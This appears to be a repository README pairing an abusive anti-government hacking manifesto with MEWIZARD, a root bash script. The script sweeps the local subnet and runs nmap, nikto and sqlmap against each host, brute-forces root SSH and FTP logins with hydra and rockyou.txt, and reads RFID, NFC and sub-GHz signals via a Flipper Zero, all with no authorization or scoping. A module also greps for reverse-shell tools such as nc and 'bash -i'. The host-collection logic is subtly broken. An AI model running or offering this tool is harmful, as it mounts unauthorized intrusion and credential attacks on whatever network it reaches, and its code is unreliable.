# M4L4K1MU3RT3---MEWIZARD-Kali-Linux-
M4L4K1MU3RT3---MEWIZARD
i told you that I dont give a fuck so this ones for all your greats out in the world that actually want to make the world a better place THIS IS FOR THE FUCKING NOBODY'S THIS IS FOR THE ONES THAT WANTED TO HAVK THE WORLD FOR REAL. YOU DESTROYED ANONYMOUS YOU LET THAT SHIT GET INFECTED WITH BULL SHIT WELL THE REAL MOTHER FUCERS ARE HERE. THE FUCKING NOBODIES YOU STUPID BITCHES THOUGHT YOU COULD STOP US ......... NO YOU FAKE BITCHES GOT ANOTHER THING COMING TO YOU BELOW IS HOW WE TRULY SAY FUCK THIS WORLD HOW WE SAY FUCK THE GOVERNMENT HOW WE SAY FUCK THE NSA THE FBI THE CIA THE DEA THE ATF AND THE FUCKING PRESIDENT AND HIS BITCH ASS CREW I TOLD YOU BITCH ALL YOU SORRY BITCHES COM GET KE. COME GET THE CHARIZARD THE FUCKING MEWTWO BUT YOUR SCARED...... PUSSYS. NOW YOU HAVE THE MEWIZARD for Kali Linux 
#!/bin/bash
# =============================================================================
# MEWIZARD for Kali Linux – Complete network penetration test
# Gathers IPs, MACs, open ports, services, vulnerabilities, phone detection,
# file integrity, system diagnostics, and Flipper Zero data.
# Run as root on your hardwired Kali machine.
# =============================================================================

set -euo pipefail
trap 'echo -e "\n\033[0;31m[!] Script interrupted. Exiting.\033[0m"; exit 1' INT

# -----------------------------------------------------------------------------
# Configuration
# -----------------------------------------------------------------------------
OUTPUT_DIR="$HOME/MEWIZARD_KALI_$(date +%Y%m%d_%H%M%S)"
MODULES_DIR="$OUTPUT_DIR/modules"
LOGS_DIR="$OUTPUT_DIR/logs"
SCANS_DIR="$OUTPUT_DIR/scans"
FLIPPER_DIR="$OUTPUT_DIR/flipper"
mkdir -p "$MODULES_DIR" "$LOGS_DIR" "$SCANS_DIR" "$FLIPPER_DIR"

LOG="$LOGS_DIR/master.log"
DEVICES_CSV="$OUTPUT_DIR/devices.csv"
SUMMARY="$OUTPUT_DIR/summary.txt"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# -----------------------------------------------------------------------------
# Helper functions
# -----------------------------------------------------------------------------
log_info() {
    echo -e "$(date '+%H:%M:%S') [INFO] $1" | tee -a "$LOG"
    echo -e "${GREEN}[INFO]${NC} $1"
}
log_warn() {
    echo -e "$(date '+%H:%M:%S') [WARN] $1" | tee -a "$LOG"
    echo -e "${YELLOW}[WARN]${NC} $1" >&2
}
log_error() {
    echo -e "$(date '+%H:%M:%S') [ERROR] $1" | tee -a "$LOG"
    echo -e "${RED}[ERROR]${NC} $1" >&2
}
log_cmd() {
    echo -e "$(date '+%H:%M:%S') [CMD] $1" >> "$LOG"
}

# Check if a command exists
check_cmd() {
    if ! command -v "$1" &>/dev/null; then
        log_error "$1 not found. Please install it."
        return 1
    fi
    return 0
}

# -----------------------------------------------------------------------------
# Write all auxiliary scripts (same functionality as Windows version)
# -----------------------------------------------------------------------------
write_modules() {
    log_info "Writing auxiliary modules..."

    # 1. file_watchdog.py
    cat > "$MODULES_DIR/file_watchdog.py" << 'EOF'
#!/usr/bin/env python3
import os, time, hashlib, sys

def sha256_file(path):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            h.update(chunk)
    return h.hexdigest()

def monitor_directory(path):
    seen = set(os.listdir(path))
    print(f"Monitoring {path} for new files... (Ctrl+C to stop)")
    try:
        while True:
            current = set(os.listdir(path))
            new_files = current - seen
            for f in new_files:
                full = os.path.join(path, f)
                if os.path.isfile(full):
                    h = sha256_file(full)
                    print(f"[+] New file: {f}  SHA256: {h}")
            seen = current
            time.sleep(5)
    except KeyboardInterrupt:
        print("\nStopped.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: file_watchdog.py <directory>")
        sys.exit(1)
    monitor_directory(sys.argv[1])
EOF
    chmod +x "$MODULES_DIR/file_watchdog.py"

    # 2. netstat_monitor.sh (Linux version)
    cat > "$MODULES_DIR/netstat_monitor.sh" << 'EOF'
#!/bin/bash
echo "Active network connections (ss -tulpn):"
ss -tulpn | grep -v "Netid"
EOF
    chmod +x "$MODULES_DIR/netstat_monitor.sh"

    # 3. prompt_hash_generator.py (same)
    cat > "$MODULES_DIR/prompt_hash_generator.py" << 'EOF'
#!/usr/bin/env python3
import hashlib, sys
def sha256_file(path):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        h.update(f.read())
    return h.hexdigest()
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: prompt_hash_generator.py <file>")
        sys.exit(1)
    print(sha256_file(sys.argv[1]))
EOF
    chmod +x "$MODULES_DIR/prompt_hash_generator.py"

    # 4. identity_checker.py (same)
    cat > "$MODULES_DIR/identity_checker.py" << 'EOF'
#!/usr/bin/env python3
import hashlib, sys, os
def sha256_file(path):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        h.update(f.read())
    return h.hexdigest()
KNOWN_HASHES = {
    "kaia_prompt.txt": "your_kaia_hash_here",
    "shadow_prompt.txt": "your_shadow_hash_here",
    "core_prompt.txt": "your_core_hash_here"
}
if __name__ == "__main__":
    errors = 0
    for fname, expected in KNOWN_HASHES.items():
        if not os.path.exists(fname):
            print(f"Missing: {fname}")
            errors += 1
            continue
        actual = sha256_file(fname)
        if actual == expected:
            print(f"{fname}: OK")
        else:
            print(f"{fname}: MISMATCH (expected {expected})")
            errors += 1
    sys.exit(errors)
EOF
    chmod +x "$MODULES_DIR/identity_checker.py"

    # 5. behavior_logger.py (same)
    cat > "$MODULES_DIR/behavior_logger.py" << 'EOF'
#!/usr/bin/env python3
import time, sys
log_file = "behavior.log"
def log_event(event):
    with open(log_file, "a") as f:
        f.write(f"{time.ctime()} - {event}\n")
    print(f"Logged: {event}")
if __name__ == "__main__":
    if len(sys.argv) > 1:
        log_event(" ".join(sys.argv[1:]))
    else:
        print("Usage: behavior_logger.py <message>")
EOF
    chmod +x "$MODULES_DIR/behavior_logger.py"

    # 6. fixed_shadowguard.sh (Linux version)
    cat > "$MODULES_DIR/fixed_shadowguard.sh" << 'EOF'
#!/bin/bash
VAULT="$HOME/.shadowguard_real"
mkdir -p "$VAULT"

SHADOW_MARK="🛡️🛡️👽🔮💬"
FINGERPRINT_HASH=$(echo -n "$SHADOW_MARK" | sha256sum | cut -d ' ' -f1)
echo "$FINGERPRINT_HASH" > "$VAULT/.identity.lock"

WATCH_FILES=(
    "$HOME/.bashrc"
    "$HOME/.zshrc"
    "$HOME/.ssh/authorized_keys"
    "$HOME/.config/autostart"
    "/etc/hosts"
)

echo "[*] Monitoring critical files. First run creates baseline."

BASELINE="$VAULT/baseline.txt"
CURRENT="$VAULT/current.txt"
DIFF="$VAULT/diff.txt"

if [[ ! -f "$BASELINE" ]]; then
    echo "[*] Creating baseline..."
    for f in "${WATCH_FILES[@]}"; do
        if [[ -e "$f" ]]; then
            sha256sum "$f" >> "$BASELINE"
        fi
    done
    echo "[✓] Baseline saved."
    exit 0
fi

> "$CURRENT"
for f in "${WATCH_FILES[@]}"; do
    if [[ -e "$f" ]]; then
        sha256sum "$f" >> "$CURRENT"
    fi
done

diff "$BASELINE" "$CURRENT" > "$DIFF"
if [[ -s "$DIFF" ]]; then
    echo "!! CHANGE DETECTED at $(date) !!"
    cat "$DIFF"
else
    echo "[✓] No changes."
fi
EOF
    chmod +x "$MODULES_DIR/fixed_shadowguard.sh"

    # 7. mimic_detector.sh (Linux version)
    cat > "$MODULES_DIR/mimic_detector.sh" << 'EOF'
#!/bin/bash
echo "[*] Running mimic detector..."

echo "[*] Checking for unusual processes..."
ps auxf | grep -E "(nc|ncat|socat|python.* -c|bash -i|perl -e)" | grep -v grep

echo "[*] Checking outbound connections..."
ss -tpn | grep ESTAB | grep -v 127.0.0.1

BIN_CHECK="/tmp/bin_hashes.txt"
if [[ ! -f "$BIN_CHECK" ]]; then
    sha256sum /bin/* /usr/bin/* 2>/dev/null > "$BIN_CHECK"
    echo "[*] Baseline for system binaries created."
else
    sha256sum /bin/* /usr/bin/* 2>/dev/null | diff - "$BIN_CHECK"
fi
echo "[*] Mimic detector finished."
EOF
    chmod +x "$MODULES_DIR/mimic_detector.sh"

    # 8. quarantine.sh (Linux version)
    cat > "$MODULES_DIR/quarantine.sh" << 'EOF'
#!/bin/bash
QUARANTINE_DIR="$HOME/quarantine"
mkdir -p "$QUARANTINE_DIR"
LOG="$QUARANTINE_DIR/quarantine.log"

for file in "$@"; do
    if [[ -f "$file" ]]; then
        dest="$QUARANTINE_DIR/$(basename "$file").$(date +%s)"
        mv "$file" "$dest"
        echo "$(date): Moved $file to $dest" >> "$LOG"
        echo "[✓] Quarantined $file"
    else
        echo "[!] Not a file: $file"
    fi
done
EOF
    chmod +x "$MODULES_DIR/quarantine.sh"

    # 9. phone_detection.sh (using arp-scan)
    cat > "$MODULES_DIR/phone_detection.sh" << 'EOF'
#!/bin/bash
echo "Scanning for phones by MAC OUI..."
if ! command -v arp-scan &>/dev/null; then
    echo "arp-scan not installed. Install with: sudo apt install arp-scan"
    exit 1
fi
sudo arp-scan --local | while read line; do
    mac=$(echo "$line" | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}')
    if [[ -n "$mac" ]]; then
        oui=$(echo "$mac" | cut -c1-8 | tr '[:lower:]' '[:upper:]')
        case $oui in
            00:1A:11|00:23:76|00:26:5E|38:87:D5|9C:F3:87|F0:9F:C2|A4:C0:E1|B0:E5:ED)
                echo "[PHONE] $line"
                ;;
        esac
    fi
done
EOF
    chmod +x "$MODULES_DIR/phone_detection.sh"

    # 10. face_detection.py (same, needs OpenCV)
    cat > "$MODULES_DIR/face_detection.py" << 'EOF'
#!/usr/bin/env python3
import cv2, sys
if len(sys.argv) < 2:
    print("Usage: face_detection.py <image_path>")
    sys.exit(1)
image = cv2.imread(sys.argv[1])
gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + "haarcascade_frontalface_default.xml")
faces = face_cascade.detectMultiScale(gray, 1.1, 4)
print(f"Found {len(faces)} face(s)")
EOF
    chmod +x "$MODULES_DIR/face_detection.py"

    # 11. prompt files
    echo "You are Kaia, a supportive and analytical assistant." > "$MODULES_DIR/kaia_prompt.txt"
    echo "You are Shadow, a tactical, security-focused assistant." > "$MODULES_DIR/shadow_prompt.txt"
    echo "You are Core, a neutral, factual assistant." > "$MODULES_DIR/core_prompt.txt"

    log_info "Modules written to $MODULES_DIR"
}

# -----------------------------------------------------------------------------
# Flipper Zero integration (using serial)
# -----------------------------------------------------------------------------
connect_flipper() {
    # Try to find flipper on /dev/ttyACM0 (common) or /dev/ttyUSB*
    for dev in /dev/ttyACM0 /dev/ttyUSB*; do
        if [[ -e "$dev" ]]; then
            # Test if it responds to a newline
            if timeout 2 stty -F "$dev" 115200 cs8 -cstopb -parenb && echo -e "\r\n" > "$dev" 2>/dev/null; then
                log_info "Flipper Zero found on $dev"
                FLIPPER_DEV="$dev"
                return 0
            fi
        fi
    done
    log_warn "Flipper Zero not found. Skipping hardware attacks."
    return 1
}

run_flipper_command() {
    local cmd="$1"
    local outfile="$2"
    local timeout="${3:-30}"
    log_info "Running Flipper command: $cmd"
    {
        echo "$cmd"
        sleep 2
        # Read for timeout seconds
        cat < "$FLIPPER_DEV" &  # background reader
        local pid=$!
        sleep "$timeout"
        kill $pid 2>/dev/null
    } > "$outfile" < "$FLIPPER_DEV"
    log_info "Output saved to $outfile"
}

flipper_scans() {
    if [[ -z "${FLIPPER_DEV:-}" ]]; then
        return
    fi
    log_info "Starting Flipper Zero scans..."
    run_flipper_command "subghz scan 300-928" "$FLIPPER_DIR/subghz.txt" 30
    run_flipper_command "rfid read" "$FLIPPER_DIR/rfid.txt" 20
    run_flipper_command "nfc detect" "$FLIPPER_DIR/nfc.txt" 20
    run_flipper_command "ibutton read" "$FLIPPER_DIR/ibutton.txt" 10
}

# -----------------------------------------------------------------------------
# Network discovery
# -----------------------------------------------------------------------------
network_discovery() {
    log_info "Discovering local network..."

    # Get local IP and subnet
    local_ip=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1 | head -1)
    if [[ -z "$local_ip" ]]; then
        log_error "Cannot determine local IP."
        exit 1
    fi
    network=$(echo "$local_ip" | cut -d. -f1-3)
    subnet="$network.0/24"
    log_info "Local IP: $local_ip, scanning subnet: $subnet"

    # Ping sweep (parallel)
    log_info "Pinging all hosts (this may take a minute)..."
    live_ips=()
    for i in {1..254}; do
        (
            if ping -c 1 -W 1 "$network.$i" &>/dev/null; then
                echo "$network.$i"
            fi
        ) &
    done
    wait
    live_ips=( $(jobs -p | xargs -I{} wait {} 2>/dev/null) )  # collect results

    log_info "Found ${#live_ips[@]} live hosts."

    # Get MAC addresses (using arp cache after ping)
    log_info "Resolving MAC addresses..."
    device_list=()
    for ip in "${live_ips[@]}"; do
        mac=$(arp -n "$ip" 2>/dev/null | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' || echo "Unknown")
        device_list+=("$ip,$mac")
    done

    # Save CSV
    echo "IP,MAC" > "$DEVICES_CSV"
    printf '%s\n' "${device_list[@]}" >> "$DEVICES_CSV"

    # Display table
    echo -e "\n${CYAN}Discovered devices:${NC}"
    printf "%-15s %-17s\n" "IP" "MAC"
    for entry in "${device_list[@]}"; do
        IFS=',' read -r ip mac <<< "$entry"
        printf "%-15s %-17s\n" "$ip" "$mac"
    done

    # Phone detection
    log_info "Checking for phones via MAC OUI..."
    "$MODULES_DIR/phone_detection.sh" | tee -a "$LOGS_DIR/phone_detection.txt"

    # Return list of IPs for scanning
    echo "${live_ips[@]}"
}

# -----------------------------------------------------------------------------
# Scan a single host (called in parallel)
# -----------------------------------------------------------------------------
scan_host() {
    local host_ip="$1"
    local safe_ip="${host_ip//./_}"
    local out_prefix="$SCANS_DIR/$safe_ip"

    # Fast nmap (top 100 ports, version, OS)
    log_info "Scanning $host_ip (nmap -T5 -F -sV -O)"
    nmap -T5 -F -sV -O "$host_ip" -oN "$out_prefix-nmap.txt" &>/dev/null

    # Check for web ports
    if grep -qE ' (80|443|8080|8443)/open' "$out_prefix-nmap.txt"; then
        proto="http"
        if grep -qE ' (443|8443)/open' "$out_prefix-nmap.txt"; then
            proto="https"
        fi
        url="$proto://$host_ip"
        log_info "Web server detected at $url, running nikto and sqlmap"

        # Nikto (tuned for speed)
        nikto -h "$url" -Tuning 123 -no404 -ssl -Format txt -o "$out_prefix-nikto.txt" &>/dev/null &

        # SQLMap (very basic)
        sqlmap -u "$url" --batch --random-agent --level=1 --risk=1 --output-dir="$out_prefix-sqlmap" &>/dev/null &
        wait
    fi

    # Quick brute‑force on SSH/FTP if wordlist exists
    if [[ -f /usr/share/wordlists/rockyou.txt ]]; then
        if grep -q ' 22/open' "$out_prefix-nmap.txt"; then
            log_info "SSH open on $host_ip, launching hydra (background)"
            hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 "ssh://$host_ip" -o "$out_prefix-hydra-ssh.txt" &>/dev/null &
        fi
        if grep -q ' 21/open' "$out_prefix-nmap.txt"; then
            log_info "FTP open on $host_ip, launching hydra (background)"
            hydra -l anonymous -P /usr/share/wordlists/rockyou.txt "ftp://$host_ip" -o "$out_prefix-hydra-ftp.txt" &>/dev/null &
        fi
        wait
    fi
}

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------
if [[ $EUID -ne 0 ]]; then
    log_error "This script must be run as root."
    exit 1
fi

log_info "====== MEWIZARD for Kali Linux starting ======"

# Write modules
write_modules

# Local diagnostics
log_info "Running local diagnostics..."
"$MODULES_DIR/netstat_monitor.sh" > "$LOGS_DIR/netstat.txt"
"$MODULES_DIR/fixed_shadowguard.sh" > "$LOGS_DIR/shadowguard.txt"
"$MODULES_DIR/mimic_detector.sh" > "$LOGS_DIR/mimic.txt"

# Network discovery
hosts=( $(network_discovery) )

# Flipper Zero
if connect_flipper; then
    flipper_scans
fi

# Parallel host scans
log_info "Starting parallel scans on ${#hosts[@]} hosts..."
pids=()
for ip in "${hosts[@]}"; do
    scan_host "$ip" &
    pids+=($!)
done
wait "${pids[@]}"
log_info "All host scans completed."

# Generate summary
cat > "$SUMMARY" << EOF
╔═══════════════════════════════════════════════════════════════════╗
║                 MEWIZARD for Kali Linux – Report                  ║
╚═══════════════════════════════════════════════════════════════════╝

Scan time: $(date)
Local IP: $local_ip
Subnet: $subnet
Hosts discovered: ${#hosts[@]}

Device list saved in: $DEVICES_CSV

Results are located in:
  $OUTPUT_DIR

Flipper Zero data (if connected): $FLIPPER_DIR
Network scans: $SCANS_DIR
System logs: $LOGS_DIR

Review individual files for detailed findings.
EOF

log_info "====== MEWIZARD complete ======"
echo -e "\n${GREEN}Results saved to: $OUTPUT_DIR${NC}"
echo -e "${CYAN}Summary: $SUMMARY${NC}"

# Optional: open folder (if GUI)
if [[ -n "$DISPLAY" ]]; then
    xdg-open "$OUTPUT_DIR" 2>/dev/null || true
fi

chmod +x ~/Desktop/mewizard_kali.sh

sudo ~/Desktop/mewizard_kali.sh
